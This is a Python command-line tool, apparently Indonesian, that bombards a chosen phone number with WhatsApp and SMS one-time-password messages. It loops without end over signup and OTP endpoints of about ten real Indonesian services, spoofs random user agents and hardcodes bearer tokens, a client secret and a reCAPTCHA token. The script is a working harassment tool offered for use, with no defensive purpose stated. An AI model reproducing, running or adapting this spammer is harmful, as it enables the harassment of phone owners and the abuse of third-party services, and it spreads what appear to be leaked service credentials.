import os, sys, time, requests as r, time, json, base64
from fake_useragent import UserAgent
from time import sleep as s

k= '\033[1;33m'; a = '\033[1;30m'; m= '\033[1;31m'; h = '\033[1;32m'; p = '\033[1;37m';
ua = UserAgent().random
ses = r.Session()
banner = f'''
{m} ___ {p} ____   __    __  __  __  __  ____  ____ {m}  ____  ____
{m}/ __){p}(  _ \ /__\  (  \/  )(  \/  )( ___)(  _ \ {m}(_  _)(  _ \\
{m}\__ \{p} )___//(__)\  )    (  )    (  )__)  )   /  {m}_)(_  )(_) )
{m}(___/{p}(__) (__)(__)(_/\/\_)(_/\/\_)(____)(_)\_){m} (____)(____/

{m} [{k} /{m} ]{p} Author :{k} Mas Mas Hengker
{m} [{k} \{m} ]{p} Github :{a} https://github.com/calonheker
'''
def wangsaf():
	os.system('clear'); print(banner)
	try:
		global target
		target = int(input(f'{m} [{h} ?{m} ]{p} Target Number :{k} '))
	except ValueError:
		print(f'{m} [ {p}! {m}]{p} Periksa Kembali Nomor Target...'); time.sleep(3); wangsaf()
	except KeyboardInterrupt:
		exit(f'{m} [ {p}! {m}]{p} Byee...')
	print(p+'-'*60)
	true = 0
	false = 0
	try:
		while True:
			hd = {'Host': 'eci.id','Accept': 'application/json, text/plain, */*','Content-Type': 'application/json','Accept': 'application/json, text/plain, */*','accept': 'application/json','x-client-id': 'b39773b0-435b-4f41-80e9-163eef20e0ab','Referer': f'https://eci.id/verification?step=1&phone=0{target}','Origin': 'https://eci.id','user-agent':''+ua}
			dt = json.dumps({"identity":f"0{target}","with":"whatsapp"})
			main = ses.post('https://eci.id/api/signup', headers=hd, data=dt)
			if "success" in main.text:
				print(f'{m} [{p} ✓{m} ]{p} Whatsapp Otp Succesfully Sending To {h}{target}');s(3);true += 1
			else:
				print(f'{m} [{p} x{m} ]{p} Whatsapp Otp Failed Sending To {a}{target}');s(3);false += 1
			hd = {'Host':'www.carsome.id','user-agent':''+ua, 'content-Accept':'application/json','accept':'application/json, text/plain, */*','country':'ID','x-amplitude-device-id':'A4p3vs1Ixu9wp3wFmCEG9K','sec-ch-ua-platform':'Android','origin':'https://www.carsome.id','referer':'https://www.carsome.id/'}
			dt = json.dumps({"username":f"{target}","optType":1})
			main = ses.post('https://www.carsome.id/website/login/sendSMS', headers=hd, data=dt)
			if "Send successfully" in main.text or "Sent successfully" in main.text:
				print(f'{m} [{p} ✓{m} ]{p} Whatsapp Otp Succesfully Sending To {h}{target}');s(3);true += 1
			else:
				print(f'{m} [{p} x{m} ]{p} Whatsapp Otp Failed Sending To {a}{target}');s(3);false += 1
			hd = {"Host":"api-v2.bukuwarung.com","user-agent":""+ua,"content-type":"application/json","x-app-version-name":"android","accept":"application/json, text/plain, */*","x-app-version-code":"3001","buku-origin":"tokoko-web","origin":"https://tokoko.id","referer":"https://tokoko.id/"}
			dt = json.dumps({"action":"LOGIN_OTP","countryCode":"+62","deviceId":"test-1","method":"WA","phone":f"{target}","clientId":"2e3570c6-317e-4524-b284-980e5a4335b6","clientSecret":"S81VsdrwNUN23YARAL54MFjB2JSV2TLn"})
			main = ses.post('https://api-v2.bukuwarung.com/api/v2/auth/otp/send', headers=hd, data=dt)
			if "WA OTP dikirim" in main.text:
				print(f'{m} [{p} ✓{m} ]{p} Whatsapp Otp Succesfully Sending To {h}{target}');s(3);true += 1
			else:
				print(f'{m} [{p} x{m} ]{p} Whatsapp Otp Failed Sending To {a}{target}');s(3);false += 1
			hd = {"Host":"www.sayurbox.com","authorization":"eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNjYyNjQwMTA4LCJleHAiOjE2NjUyMzIxMDgsImlhdCI6MTY2MjY0MDEwOCwiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGx9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6ImIwYjc1ZjI1LTllZmYtNDJjNS1hNmJiLWMyYjA3ZGI2YjVkOSIsInN1YiI6IllsNzB5YmtVWFl1dmstU3BTbkQ0ODlWX3NGOTIiLCJ1c2VyX2lkIjoiWWw3MHlia1VYWXV2ay1TcFNuRDQ4OVZfc0Y5MiJ9.DCYJRFjl-TTezyjXba-XLOOUK2ppvNBL--ETojGa_UauO0zyaaD090eFaMpglVThj-y3fbFany9eT1qx5y1olulqTGxExI1DsIVN8_Ds6cQuTPaYsBKFwgHZQSnKRkRAP3aEILhzRMsUUG7kwBJWCziTC9nGfBWl7tPwHoYmnerOzsSnTUjCnOfDphMuj_glxHsKDPtIUwie2xi00d0NhMDnc2kyrkJc8xer7XLXWJGzZVvI-3wl72VLcB1GmDVZKo-JX9tAhzO7lsGSXm9G0lSYKD_NUUMKbU7d4w_2Col3Lhu6E0ltyw4nmna8ssc0q8_ti1b9F-HL1GfRzTRa-g","content-type":"application/json","accept":"*/*","x-bundle-revision":"6.0","x-sbox-tenant":"sayurbox","x-binary-version":"2.2.1","user-agent":""+ua,"origin":"https://www.sayurbox.com"}
			dt = json.dumps({"operationName":"generateOTP","variables":{"destinationType":"whatsapp","identity":f"+62{target}"},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"})
			main = ses.post('https://www.sayurbox.com/graphql/v1?deduplicate=1', headers=hd, data=dt)
			if "__typename" in main.text:
				print(f'{m} [{p} ✓{m} ]{p} Whatsapp Otp Succesfully Sending To {h}{target}');s(3);true += 1
			else:
				print(f'{m} [{p} x{m} ]{p} Whatsapp Otp Failed Sending To {a}{target}');s(3);false += 1
			hd = {'Host': 'club-id.voopoo.com','accept': 'application/json, text/javascript, */*; q=0.01','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','x-requested-with': 'XMLHttpRequest','user-agent': ''+ua,'origin': 'https://club-id.voopoo.com','referer': 'https://club-id.voopoo.com/register.php?lang=idn&referralid=857'}
			dt = f'mobile=0062{target}&lang=idn&country_code=0062&source=H5'
			main = ses.post('https://club-id.voopoo.com/api/mobile/index.php?version=5&referralid=857&module=sendsms', headers=hd, data=dt)
			if "1000" in main.text:
				print(f'{m} [{p} ✓{m} ]{p} Whatsapp Otp Succesfully Sending To {h}{target}');s(3);true += 1
			else:
				print(f'{m} [{p} x{m} ]{p} Whatsapp Otp Failed Sending To {a}{target}');s(3);false += 1
	except KeyboardInterrupt:
		print(p+'-'*58)
		exit(f'{m} [ {p}! {m}]{p} Status Success {k}( {h}{true}{k} ) {p}Failled{k} ( {m}{false}{k} )')

def semes():
	os.system('clear'); print(banner)
	try:
		global target
		target = int(input(f'{m} [{h} ?{m} ]{p} Target Number :{k} '))
	except ValueError:
		print(f'{m} [ {p}! {m}]{p} Periksa Kembali Nomor Target...'); time.sleep(3); semes()
	except KeyboardInterrupt:
		exit(f'{m} [ {p}! {m}]{p} Byee...')
	print(p+'-'*60)
	true = 0
	false = 0
	try:
		while True:
			dt = json.dumps({"phone":f"0{target}","action":"register","channel":"message","email":"","token":0,"customer_id":"0","is_resend":0})
			hd = {'Host': 'wapi.ruparupa.com','authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiNmQwODgxMTEtMzBkYy00NzJmLTkyMGItZTU0MDJkZDlkMTYyIiwiaWF0IjoxNjY2ODc0MTk2LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.m3DThsLE62zkPMIEJGH8GI6uubJe5h4VD80ksEdCIx4','user-agent': ''+ua,'content-type': 'application/json','x-company-name': 'odi','accept': 'application/json','informa-b2b': 'false','origin': 'https://www.ruparupa.com','referer': 'https://www.ruparupa.com/verification?page=otp-choices'}
			main = ses.post('https://wapi.ruparupa.com/auth/generate-otp', headers=hd, data=dt)
			if "success" in main.text:
				print(f'{m} [{p} ✓{m} ]{p} Sms Succesfully Sending To {h}+62{target}');s(3);true += 1
			else:
				print(f'{m} [{p} x{m} ]{p} Sms Failed Sending To {a}+62{target}');s(3);false += 1
			dt = json.dumps({"identity":f"0{target}","with":"sms"})
			hd = {'Host': 'eci.id','Accept': 'application/json, text/plain, */*','Content-Type': 'application/json','Accept': 'application/json, text/plain, */*','accept': 'application/json','x-client-id': 'b39773b0-435b-4f41-80e9-163eef20e0ab','user-agent':''+ua}
			main = ses.post('https://eci.id/api/signup', headers=hd, data=dt)
			if "success" in main.text:
				print(f'{m} [{p} ✓{m} ]{p} Sms Succesfully Sending To {h}+62{target}');s(3);true += 1
			else:
				print(f'{m} [{p} x{m} ]{p} Sms Failed Sending To {a}+62{target}');s(3);false += 1
			dt = json.dumps({"phone":f"62{target}"})
			hd = {'Host': 'api.medkomtek.com','accept': 'application/json','x-api-platform': 'eyJhcHBfdmVyc2lvbiI6IjIuMC4wIiwicGxhdGZvcm0iOiJ3ZWIiLCJtYW51ZmFjdHVyZXIiOiJCbGluayIsInByb2R1Y3QiOiJ2aXZvIDE4MjAiLCJkZXNjcmlwdGlvbiI6IkNocm9tZSBNb2JpbGUgMTA2LjAuMC4wIG9uIHZpdm8gMTgyMCAoQW5kcm9pZCA4LjEuMCkifQ==','content-type': 'application/json','user-agent':''+ua}
			main = ses.post('https://api.medkomtek.com/v2/publishing/users/check', headers=hd, data=dt)
			if "Success" in main.text:
				print(f'{m} [{p} ✓{m} ]{p} Sms Succesfully Sending To {h}+62{target}');s(3);true += 1
			else:
				print(f'{m} [{p} x{m} ]{p} Sms Failed Sending To {a}+62{target}');s(3);false += 1
			dt = json.dumps({"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":f"+62{target}","hashCode":"","channel":"SMS","userType":"MERCHANT","reCaptchaToken":"03AIIukziFoais3-6LL8xNupcoZNz1frp_ijhbNRZJwIvWVG5QBEpkCUlla1Em21Ix1K8e1sFoS1gyglFpphShKac_hb2u4UeE5HJef8mOhIiVwcsNrX8Vm-QJU1_N7sG71SFI59tHCb671GSUmsei5ISDvnU5mAujb7d70uvPir3p3kZTSo_ZOvPFgHRY7noPogTRlGBlmUj1JjPiWI6FExaVPJTjCIqSujFmIeFfIFyEtzVZBhJj7pldS9sFB_9GsoQgRi-fKjxVN-43p1aEv_1IRk_dXmDPvqS0v0RTPdagp7OAiK2u5zGIswSUc-yjzKltF-SdzxhLb4onpZIlNF9H_ZORO20wwfZPMCPl4t7zETMv27GZLu6ERGnyWOJRVAy86AqxlIOYOCUNR9A5fKr3rKzVuczi5hzMmqX5f7HASp6V5nV5rXMvSrcfsNaX1DOCLNP59WnMOs9jqlEBB899yYZvAofkNKEoAGnCD6Uu8mazJEbhZ3mpWK0OrLXigwWpcuv8l6Ctebz8dmIbi0kVc4nZZrC8kBibW34PyWOIk5HFEbRz7SRHaC93opjCh2Fu5oVNvcboRZorCedXlAiUC5F5tJZjJlN8BbytGifprDPuML7-bWE7SeY3o_zz-dlkLhc6-OQz9vs0cDeUlSAwNlYb1wSudtpEWot5XNzozFRSD1Kb7RK4sW0-bSJnHkGVYmCmlxQ_iotxlcrdsjuLjbtq-153OJPPBYvz3OlwgIJ3y4MdJnY1qdW7DEivZuNMUZBD91GoblFEor-dYIkwxeoGHpVZE6z6bLWkiyQ0Lpone4la_Yu5DMoXPhMDJ3jkQmOXOtnL4lknUV7zEEXMSk7cBoLOucqFX-lsIs2ecfV1Pm4BachEAtThBHEoasmsvoaU0VCon_4doItT6gBvSfHysytUaqDAeUnBUR6dsg6n1l99RZpvXhNoJs_8Jil2Pc8ySuC531_UngtWZCG6lQHf9d__jDYtEjLE0UV9QxkjKC-72uZSs6pKfRnq12W24-Y_5tPcUqqw3kMh9opbGi8swSQI2wPCG94U55onQ7CvwXIYBKlfMNxOl0zGenWt-8IgGg6VUFGaKYplohdi5aSrH-exx-vMPAq8i6ms9FKuQPd5G8sTEhR5uZuz2ocTLfAW93kj6MDw8Ob_jTLILarhe07ox4XWIgsVeqAzvZ59R9pztLO0X1htgVFYU67l5HBToIvouO-qVDBBne5RK6teFB08H3_bvfV2W0fH2KTO3Luc3g6EjfHXpMkNRu8atgQwoXDfzjIjhrtJdDz2yxq0xgFs1tmlnLdErqjQE7vgc2gSIxOOPd7uUYZF_axVpBC-7KfYO1myLfsr-oLAbcX2yfNacI2Xj468iCFMRxFtvgYJcL8I66FCT8ziks07XaK57e9OhbGtT8EPlyd1H0D3rF2hncreO9U3hUPb4L0I8z_OSvi7jDUi7zv9M3vphVTt34Kqyxidf8RXKX6IUIPlXf-z6XjFRiUmHnaacfmJSzp5SO-ZdcBERKNsbSIti8DBmUquwJb3stkV4imhfop6sANqkQ"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"})
			hd = {'Host': 'api.tokko.io','content-type': 'application/json','accept': '*/*','x-tokko-api-client': 'merchant_web','user-agent':''+ua}
			main = ses.post('https://api.tokko.io/graphql', headers=hd, data=dt)
			if "phoneNumber" in main.text:
				print(f'{m} [{p} ✓{m} ]{p} Sms Succesfully Sending To {h}+62{target}');s(3);true += 1
			else:
				print(f'{m} [{p} x{m} ]{p} Sms Failed Sending To {a}+62{target}');s(3);false += 1
			hd = {'Host': 'www.sayurbox.com','authorization': 'eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNjY1Nzg3NzgzLCJleHAiOjE2NjgzNzk3ODMsImlhdCI6MTY2NTc4Nzc4MywiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGx9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6Ijc4YTA4NDFiLTFkNWUtNDU3OS1iZjQ4LWM0ODMzNTcxZDA2NSIsInN1YiI6Ik9ubnFTbVNtczFrRkZJQklHWWNCUl9ZWWFqc28iLCJ1c2VyX2lkIjoiT25ucVNtU21zMWtGRklCSUdZY0JSX1lZYWpzbyJ9.L9Gsl3FcDDHvXyYjpgHNwUZ6FL0PzLRIWDUp9gtpbb-g1j1EyUkf5K-pZwiT2Sybc93N8UX1lDh-A3c9gpjn-1p1xtfAYwwcqn_u5f9z-ed6yzR_9NQmmnWJxTym-3FU7qfY2NlaIEnTeYUNV7Jdk_DxbQLZ78ztvk-AXlVHqWMB1x-tXlDa85PdIi8eXOoprCkUGBfY26yQ3jltQgwz_QL0-LLEClYqy_D57CZNXOBnBgrqccjDbZYlXLkIjC9-cjhQLgFl-5HyBFNScOVQzfnICRTdTU6yeo993zEZ2rmhTWAzgknP8fH1hC6dw7T6wEL1O7_aqF5N-sTlQio23Q','content-type': 'application/json','origin': 'https://www.sayurbox.com','user-agent':''+ua}
			dt = json.dumps([{"operationName":"generateOTP","variables":{"destinationType":"sms","identity":f"+62{target}"},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"}])
			main = ses.post('https://www.sayurbox.com/graphql/v1?deduplicate=1', headers=hd, data=dt)
			if "AuthIDResponseType" in main.text:
				print(f'{m} [{p} ✓{m} ]{p} Sms Succesfully Sending To {h}+62{target}');s(3);true += 1
			else:
				print(f'{m} [{p} x{m} ]{p} Sms Failed Sending To {a}+62{target}');s(3);false += 1
			hd = {'User-Agent': ''+ua,'Content-Type': 'application/json','Accept': '*/*','Origin': 'https://momobil.id'}
			dt = json.dumps({"to":f"0{target}","type":"register"})
			main = ses.post('https://api.momobil.id/users/otp/send', headers=hd, data=dt)
			if "MESSAGE_SENT" in main.text:
				print(f'{m} [{p} ✓{m} ]{p} Sms Succesfully Sending To {h}+62{target}');s(3);true += 1
			else:
				print(f'{m} [{p} x{m} ]{p} Sms Failed Sending To {a}+62{target}');s(3);false += 1
			sample_string = f"0{target}-M0M0T0RK3Y"
			sample_string_bytes = sample_string.encode("ascii")
			base64_bytes = base64.b64encode(sample_string_bytes)
			base64_string = base64_bytes.decode("ascii")
			hd = {'Host': 'api.momotor.id','accept': '*/*','content-type': 'application/json','user-agent': ''+ua,'origin': 'https://momotor.id','referer': 'https://momotor.id/'}
			dt = json.dumps({"to":f"{base64_string}"})
			main = ses.post('https://api.momotor.id/users/motor/send-otp', headers=hd, data=dt)
			if "pinId" in main.text:
				print(f'{m} [{p} ✓{m} ]{p} Sms Succesfully Sending To {h}+62{target}');s(3);true += 1
			else:
				print(f'{m} [{p} x{m} ]{p} Sms Failed Sending To {a}+62{target}');s(3);false += 1
	except KeyboardInterrupt:
		print(p+'-'*58)
		exit(f'{m} [ {p}! {m}]{p} Status Success {k}( {h}{true}{k} ) {p}Failled{k} ( {m}{false}{k} )')


def start():
	os.system('clear'); print(banner); print(f'''{m} [{p} 1{m} ]{p} Spam Whatsapp\n{m} [{p} 2{m} ]{p} Spam Sms''')
	sponge = input(f'\n{m} [{h} ?{m} ]{p} Chose Number :{h} ')
	if sponge == '1' or sponge == '01':
		wangsaf()
	elif sponge == '2' or sponge == '02':
		semes()
	else:
		exit(f'{m} [{p} !{m} ]{p} Pilih Yang Bener Napa...')

if __name__=='__main__':
	os.system('git pull')
	start()
